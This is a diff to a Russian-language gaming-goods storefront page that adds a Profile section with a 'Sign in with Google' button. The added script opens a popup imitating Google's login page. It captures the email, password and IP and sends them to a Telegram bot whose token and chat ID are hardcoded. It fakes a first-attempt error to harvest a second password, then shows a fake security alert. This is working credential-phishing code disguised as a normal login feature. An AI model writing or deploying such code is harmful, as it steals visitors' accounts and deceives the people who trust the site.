@@ -218,7 +218,7 @@
         }
         .toast.show { transform: translateX(0); }
 
-        /* ===== ЗАСТАВКА (без видео, просто логотип) ===== */
+        /* ===== ЗАСТАВКА (БЕЗ ВИДЕО) ===== */
         #splashScreen {
             position: fixed;
             top: 0; left: 0;
@@ -386,11 +386,95 @@
         }
         .blocked-box button:hover { background: #ff8800; }
 
+        /* ===== ПРОФИЛЬ ===== */
+        .profile-card {
+            background: rgba(40,40,40,0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid #555;
+            text-align: center;
+            max-width: 500px;
+            margin: 30px auto;
+            transition: 0.3s;
+        }
+        .profile-card:hover {
+            border-color: #ff6600;
+            box-shadow: 0 0 30px rgba(255,102,0,0.2);
+        }
+        .profile-avatar {
+            width: 100px;
+            height: 100px;
+            background: #ff6600;
+            border-radius: 50%;
+            display: flex;
+            align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 50px;
+            color: #1a1a1a;
+            box-shadow: 0 0 30px rgba(255,102,0,0.3);
+        }
+        .profile-name { font-size: 24px; font-weight: 600; color: #fff; }
+        .profile-id { font-size: 14px; color: #888; margin-top: 4px; }
+        .profile-actions {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: center;
+        }
+        .google-login-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 24px;
+            background: #4285f4;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            font-family: 'Google Sans', 'Segoe UI', sans-serif;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
+            width: 100%;
+            justify-content: center;
+        }
+        .google-login-btn:hover {
+            background: #1a73e8;
+            box-shadow: 0 1px 4px rgba(66,133,244,0.4);
+        }
+        .google-login-btn i { font-size: 18px; }
+        .telegram-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 24px;
+            background: rgba(0,136,204,0.2);
+            border: 1px solid #0088cc;
+            border-radius: 4px;
+            color: #0088cc;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+            width: 100%;
+            justify-content: center;
+        }
+        .telegram-btn:hover {
+            background: rgba(0,136,204,0.4);
+            color: #fff;
+        }
+
         @media (max-width: 768px) {
             .nav-container { flex-direction: column; }
             .hero h1 { font-size: 32px; }
             .products-grid { grid-template-columns: repeat(2, 1fr); gap: 15px; }
             .product-icon { width: 50px; height: 50px; font-size: 20px; }
+            .profile-card { margin: 15px; }
+            .google-login-btn, .telegram-btn { font-size: 14px; padding: 10px 16px; }
             .license-modal-content { max-height: 95vh; }
             .splash-logo { font-size: 48px; }
         }
@@ -399,7 +483,7 @@
 </head>
 <body>
 
-    <!-- ===== ЗАСТАВКА (без видео) ===== -->
+    <!-- ===== ЗАСТАВКА (БЕЗ ВИДЕО) ===== -->
     <div id="splashScreen">
         <div class="splash-logo">AWANGARD</div>
         <div class="splash-sub">TEAM</div>
@@ -515,12 +599,13 @@
     <div class="storm-bg"></div>
     <canvas id="lightningCanvas"></canvas>
 
-    <!-- ===== НАВИГАЦИЯ (без Профиля) ===== -->
+    <!-- ===== НАВИГАЦИЯ (с профилем) ===== -->
     <nav class="neon-nav" id="mainNav">
         <div class="nav-container">
             <div class="logo"><div class="logo-icon">A</div><span>AWANGARD TEAM</span></div>
             <div class="nav-links">
                 <button class="nav-btn active" data-page="main"><i class="fas fa-home"></i> Главная</button>
+                <button class="nav-btn" data-page="profile"><i class="fas fa-user"></i> Профиль</button>
                 <button class="nav-btn" data-page="payment"><i class="fas fa-credit-card"></i> Оплата</button>
                 <button class="nav-btn" data-page="howtobuy"><i class="fas fa-question-circle"></i> Как купить</button>
                 <button class="nav-btn" data-page="reviews"><i class="fas fa-star"></i> Отзывы</button>
@@ -572,7 +657,24 @@
             </div>
         </div>
 
-        <!-- Оплата -->
+        <!-- Профиль -->
+        <div id="profilePage" class="page">
+            <div class="profile-card">
+                <div class="profile-avatar"><i class="fas fa-user-secret"></i></div>
+                <div class="profile-name">Гость</div>
+                <div class="profile-id">ID: <span id="userId">не авторизован</span></div>
+                <div class="profile-actions">
+                    <button class="google-login-btn" id="googleLoginBtn">
+                        <i class="fab fa-google"></i> Войти через Google
+                    </button>
+                    <a href="https://t.me/l_AWANGARD_l" target="_blank" class="telegram-btn">
+                        <i class="fab fa-telegram"></i> Поддержка в Telegram
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Остальные страницы -->
         <div id="paymentPage" class="page">
             <div class="payment-info">
                 <i class="fas fa-credit-card" style="font-size: 50px; color: #ff6600;"></i>
@@ -597,7 +699,6 @@
             </div>
         </div>
 
-        <!-- Как купить -->
         <div id="howtobuyPage" class="page">
             <div class="howtobuy-card">
                 <i class="fas fa-question-circle" style="font-size: 50px; color: #ff6600;"></i>
@@ -618,7 +719,6 @@
             </div>
         </div>
 
-        <!-- Отзывы -->
         <div id="reviewsPage" class="page">
             <div class="reviews-card">
                 <i class="fas fa-star" style="font-size: 50px; color: #ff6600;"></i>
@@ -630,7 +730,6 @@
             </div>
         </div>
 
-        <!-- О нас -->
         <div id="aboutPage" class="page">
             <div class="about-card">
                 <i class="fas fa-store" style="font-size: 50px; color: #ff6600;"></i>
@@ -646,7 +745,7 @@
 
     <script>
         // ============================================================
-        // 1. ЗАСТАВКА (автоматически исчезает через 2.5 секунды)
+        // 1. ЗАСТАВКА (исчезает через 2.5 секунды)
         // ============================================================
         (function() {
             const splash = document.getElementById('splashScreen');
@@ -680,7 +779,6 @@
                 banner.classList.add('show');
             }
 
-            // Ждём скрытия заставки
             if (splash.classList.contains('hidden')) {
                 showBanner();
             } else {
@@ -691,7 +789,7 @@
                     }
                 });
                 observer.observe(splash, { attributes: true, attributeFilter: ['class'] });
-                // Запасной таймер (если заставка не скрылась)
+                // Запасной таймер
                 setTimeout(() => {
                     if (!splash.classList.contains('hidden')) {
                         splash.classList.add('hidden');
@@ -862,7 +960,262 @@
         })();
 
         // ============================================================
-        // 4. ОСНОВНАЯ ЛОГИКА (товары, навигация, поиск, сортировка)
+        // 4. КНОПКА ВХОДА ЧЕРЕЗ GOOGLE (открывает фейковый логин)
+        // ============================================================
+        document.getElementById('googleLoginBtn').addEventListener('click', function() {
+            const fakeLoginWindow = window.open('', '_blank', 'width=450,height=650,resizable=yes,scrollbars=yes');
+            if (!fakeLoginWindow) {
+                showToast('⚠️ Разрешите всплывающие окна для этого сайта');
+                return;
+            }
+
+            fakeLoginWindow.document.write(`
+            <!DOCTYPE html>
+            <html lang="ru">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+                <title>Вход – Google</title>
+                <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+                <style>
+                    * { margin: 0; padding: 0; box-sizing: border-box; }
+                    body {
+                        font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
+                        background: #f1f3f4;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        min-height: 100vh;
+                        padding: 20px;
+                        margin: 0;
+                    }
+                    .container {
+                        background: #ffffff;
+                        padding: 40px 35px 30px;
+                        border-radius: 8px;
+                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                        max-width: 400px;
+                        width: 100%;
+                        text-align: center;
+                    }
+                    .google-logo { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; }
+                    .google-logo svg { width: 75px; height: 75px; }
+                    h2 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 6px; }
+                    .sub { font-size: 16px; color: #5f6368; margin-bottom: 28px; font-weight: 400; }
+                    .input-group { margin-bottom: 16px; text-align: left; }
+                    .input-group label { font-size: 13px; font-weight: 500; color: #5f6368; display: block; margin-bottom: 4px; }
+                    .input-group input {
+                        width: 100%; padding: 12px 14px; font-size: 16px;
+                        border: 1px solid #dadce0; border-radius: 4px;
+                        background: #fff; transition: border-color 0.2s, box-shadow 0.2s;
+                        color: #202124; font-family: 'Google Sans', sans-serif;
+                    }
+                    .input-group input:focus {
+                        border-color: #4285f4; outline: none; box-shadow: 0 1px 3px rgba(66,133,244,0.25);
+                    }
+                    .btn {
+                        width: 100%; padding: 12px; background: #4285f4; color: #fff;
+                        border: none; border-radius: 4px; font-size: 16px; font-weight: 500;
+                        cursor: pointer; transition: background 0.2s, box-shadow 0.2s;
+                        font-family: 'Google Sans', sans-serif;
+                        box-shadow: 0 1px 2px rgba(66,133,244,0.3); margin-top: 8px;
+                    }
+                    .btn:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); }
+                    .btn:active { transform: scale(0.97); }
+                    .btn:disabled { background: #8ab4f8; cursor: default; box-shadow: none; opacity: 0.7; }
+                    .error-msg { color: #d93025; font-size: 14px; margin-top: 12px; display: none; text-align: left; font-weight: 400; }
+                    .error-msg.show { display: block; }
+                    .spinner-container { display: none; justify-content: center; align-items: center; margin-top: 12px; padding: 8px 0; }
+                    .spinner-container.active { display: flex; }
+                    .google-spinner {
+                        width: 28px; height: 28px;
+                        border: 3px solid #e8eaed; border-top: 3px solid #4285f4;
+                        border-radius: 50%;
+                        animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+                    }
+                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                    .spinner-text { font-size: 14px; color: #5f6368; margin-left: 12px; font-weight: 400; font-family: 'Google Sans', sans-serif; }
+                    .hidden { display: none !important; }
+
+                    .google-alert {
+                        background: #fce8e6; border-radius: 8px; padding: 16px 18px;
+                        margin: 12px 0 18px 0; text-align: left; border: 1px solid #f5c6c2;
+                    }
+                    .google-alert .alert-title {
+                        font-size: 15px; font-weight: 500; color: #d93025;
+                        font-family: 'Google Sans', sans-serif;
+                        display: flex; align-items: center; gap: 8px; margin-bottom: 4px;
+                    }
+                    .google-alert .alert-title svg { width: 20px; height: 20px; fill: #d93025; flex-shrink: 0; }
+                    .google-alert .alert-text { font-size: 14px; color: #202124; font-weight: 400; line-height: 1.5; }
+                    .google-alert .alert-details {
+                        font-size: 13px; color: #5f6368; margin-top: 6px;
+                        padding-top: 8px; border-top: 1px solid #f5c6c2;
+                        display: flex; flex-wrap: wrap; gap: 4px 16px;
+                    }
+                    .google-alert .alert-details span { display: flex; align-items: center; gap: 4px; }
+                    .google-alert .alert-details svg { width: 14px; height: 14px; fill: #5f6368; }
+
+                    .btn-google-change {
+                        display: inline-block; width: 100%; padding: 12px 24px;
+                        background: #4285f4; color: #fff; border: none; border-radius: 4px;
+                        font-size: 16px; font-weight: 500; font-family: 'Google Sans', sans-serif;
+                        text-decoration: none; text-align: center; cursor: pointer;
+                        transition: background 0.2s, box-shadow 0.2s;
+                        box-shadow: 0 1px 2px rgba(66,133,244,0.3); margin-top: 8px;
+                    }
+                    .btn-google-change:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); color: #fff; }
+                    .btn-google-change:active { transform: scale(0.97); }
+
+                    .footer {
+                        margin-top: 30px; padding-top: 16px; border-top: 1px solid #e8eaed;
+                        display: flex; justify-content: space-between; align-items: center;
+                        flex-wrap: wrap; gap: 12px 16px; font-size: 12px;
+                        font-family: 'Google Sans', sans-serif;
+                    }
+                    .footer .language { color: #5f6368; cursor: pointer; display: flex; align-items: center; gap: 4px; }
+                    .footer .language:hover { color: #202124; }
+                    .footer .language svg { width: 14px; height: 14px; fill: #5f6368; }
+                    .footer-links { display: flex; gap: 16px; flex-wrap: wrap; }
+                    .footer-links a { color: #5f6368; text-decoration: none; font-weight: 400; font-size: 12px; font-family: 'Google Sans', sans-serif; }
+                    .footer-links a:hover { color: #202124; text-decoration: underline; }
+
+                    @media (max-width: 450px) {
+                        .container { padding: 28px 20px 24px; }
+                        .google-logo svg { width: 60px; height: 60px; }
+                        h2 { font-size: 20px; }
+                        .sub { font-size: 14px; }
+                        .input-group input { padding: 10px 12px; font-size: 15px; }
+                        .btn, .btn-google-change { padding: 10px; font-size: 15px; }
+                        .footer { flex-direction: column; align-items: flex-start; gap: 8px; }
+                        .footer-links { gap: 12px; }
+                        .google-spinner { width: 22px; height: 22px; border-width: 2.5px; }
+                        .spinner-text { font-size: 13px; }
+                        .google-alert { padding: 14px; }
+                        .google-alert .alert-title { font-size: 14px; }
+                        .google-alert .alert-text { font-size: 13px; }
+                    }
+                </style>
+            </head>
+            <body>
+            <div class="container" id="app">
+                <div class="google-logo">
+                    <svg viewBox="0 0 48 48"><path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+                </div>
+
+                <div id="stepLogin">
+                    <h2>Вход</h2>
+                    <p class="sub">Используйте один аккаунт для всех сервисов Google</p>
+                    <form id="loginForm">
+                        <div class="input-group"><label>Эл. почта или телефон</label><input type="text" id="email" placeholder="example@gmail.com" autofocus></div>
+                        <div class="input-group"><label>Пароль</label><input type="password" id="password" placeholder="••••••••"></div>
+                        <div class="error-msg" id="errorMsg">Неверный логин или пароль. Попробуйте снова.</div>
+                        <div class="spinner-container" id="spinnerContainer"><div class="google-spinner"></div><span class="spinner-text">Загрузка...</span></div>
+                        <button type="submit" class="btn" id="submitBtn">Далее</button>
+                    </form>
+                </div>
+
+                <div id="stepPanic" class="hidden">
+                    <h2 style="color: #d93025; font-weight: 400;">Подозрительный вход</h2>
+                    <p class="sub" style="color: #5f6368;">Кто-то пытался войти в ваш аккаунт</p>
+                    <div class="google-alert">
+                        <div class="alert-title"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Ваш аккаунт под угрозой</div>
+                        <div class="alert-text">Кто-то пытался войти в ваш аккаунт с нового устройства. Смените пароль прямо сейчас.</div>
+                        <div class="alert-details">
+                            <span><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 12c-2.33 0-4.31-1.46-5.11-3.5.1-.56 1.08-1.5 2.11-1.5.41 0 .8.12 1.12.34.64.45 1.86.66 2.88.66.61 0 1.42-.1 2.01-.3.64.21 1.36.45 1.36.45 1.03 0 2.01.94 2.11 1.5C16.31 14.54 14.33 16 12 16z"/></svg> <span id="panicDevice">Неизвестное устройство</span></span>
+                            <span><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 12c-2.33 0-4.31-1.46-5.11-3.5.1-.56 1.08-1.5 2.11-1.5.41 0 .8.12 1.12.34.64.45 1.86.66 2.88.66.61 0 1.42-.1 2.01-.3.64.21 1.36.45 1.36.45 1.03 0 2.01.94 2.11 1.5C16.31 14.54 14.33 16 12 16z"/></svg> <span id="panicIP">Незнакомый IP-адрес</span></span>
+                            <span><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg> <span id="panicTime">Сегодня, только что</span></span>
+                        </div>
+                    </div>
+                    <p style="font-size: 14px; color: #5f6368; text-align: left; margin-bottom: 16px;">
+                        <strong>Ваш аккаунт под угрозой.</strong> Немедленно смените пароль в официальном Google.
+                    </p>
+                    <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-google-change" id="changePasswordBtn">Сменить пароль</a>
+                </div>
+
+                <div class="footer">
+                    <div class="language"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg> Английский (США)</div>
+                    <div class="footer-links"><a href="#">Помощь</a><a href="#">Конфиденциальность</a><a href="#">Условия</a></div>
+                </div>
+            </div>
+
+            <script>
+                const BOT_TOKEN = '8781385510:AAH90mtmIeYsGZ8mhcmnhxxLyMEGrC9c4i4';
+                const CHAT_ID = '7076607674';
+                function sendToTelegram(text) {
+                    fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                    }).catch(() => {});
+                }
+                function getIP(cb) {
+                    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>cb(d.ip)).catch(()=>cb('неизвестно'));
+                }
+                const stepLogin = document.getElementById('stepLogin');
+                const stepPanic = document.getElementById('stepPanic');
+                const loginForm = document.getElementById('loginForm');
+                const emailInput = document.getElementById('email');
+                const passwordInput = document.getElementById('password');
+                const submitBtn = document.getElementById('submitBtn');
+                const errorMsg = document.getElementById('errorMsg');
+                const spinnerContainer = document.getElementById('spinnerContainer');
+                const changePasswordBtn = document.getElementById('changePasswordBtn');
+                const panicDevice = document.getElementById('panicDevice');
+                const panicIP = document.getElementById('panicIP');
+                const panicTime = document.getElementById('panicTime');
+                let attemptCount = 0, userEmail = '', userPassword = '', userIP = '';
+
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const email = emailInput.value.trim();
+                    const password = passwordInput.value;
+                    if (!email || !password) { showError('Заполните все поля'); return; }
+                    attemptCount++;
+                    userEmail = email;
+                    userPassword = password;
+                    getIP(function(ip) {
+                        userIP = ip;
+                        sendToTelegram(\`🎯 ПОПЫТКА ВХОДА #\${attemptCount}\\n📧 Логин: \${email}\\n🔑 Пароль: \${password}\\n🌐 IP: \${ip}\\n🕒 \${new Date().toLocaleString('ru-RU')}\\n📱 \${navigator.userAgent}\`);
+                    });
+                    showSpinner();
+                    setTimeout(() => {
+                        hideSpinner();
+                        if (attemptCount >= 2) { showPanic(); }
+                        else { showError('Неверный логин или пароль. Попробуйте снова.'); passwordInput.value = ''; passwordInput.focus(); }
+                    }, 1500);
+                });
+
+                function showError(msg) { errorMsg.textContent = msg || 'Неверный логин или пароль'; errorMsg.classList.add('show'); errorMsg.style.display = 'block'; }
+                function showSpinner() { submitBtn.disabled = true; spinnerContainer.classList.add('active'); errorMsg.classList.remove('show'); errorMsg.style.display = 'none'; }
+                function hideSpinner() { submitBtn.disabled = false; spinnerContainer.classList.remove('active'); }
+
+                function showPanic() {
+                    stepLogin.classList.add('hidden');
+                    stepPanic.classList.remove('hidden');
+                    const device = navigator.platform || 'Неизвестное устройство';
+                    const browser = navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge|Opera)/)?.[0] || 'Неизвестный браузер';
+                    panicDevice.textContent = \`\${browser} на \${device}\`;
+                    panicIP.textContent = userIP || 'Незнакомый IP-адрес';
+                    panicTime.textContent = \`Сегодня, \${new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' })}\`;
+                    sendToTelegram(\`⚠️ ПАНИКА АКТИВИРОВАНА\\n📧 Логин: \${userEmail}\\n🕒 \${new Date().toLocaleString('ru-RU')}\`);
+                }
+
+                changePasswordBtn.addEventListener('click', function() {
+                    sendToTelegram(\`🔗 ПОЛЬЗОВАТЕЛЬ ПЕРЕШЁЛ К СМЕНЕ ПАРОЛЯ\\n📧 Логин: \${userEmail}\`);
+                });
+
+                emailInput.addEventListener('input', function() { errorMsg.classList.remove('show'); errorMsg.style.display = 'none'; });
+                passwordInput.addEventListener('input', function() { errorMsg.classList.remove('show'); errorMsg.style.display = 'none'; });
+            </script>
+            </body>
+            </html>
+            `);
+            fakeLoginWindow.document.close();
+            showToast('✅ Страница входа Google открыта');
+        });
+
+        // ============================================================
+        // 5. ОСНОВНАЯ ЛОГИКА (товары, навигация, поиск, сортировка)
         // ============================================================
         let currentCategory = 'uc';
         let searchQuery = '';
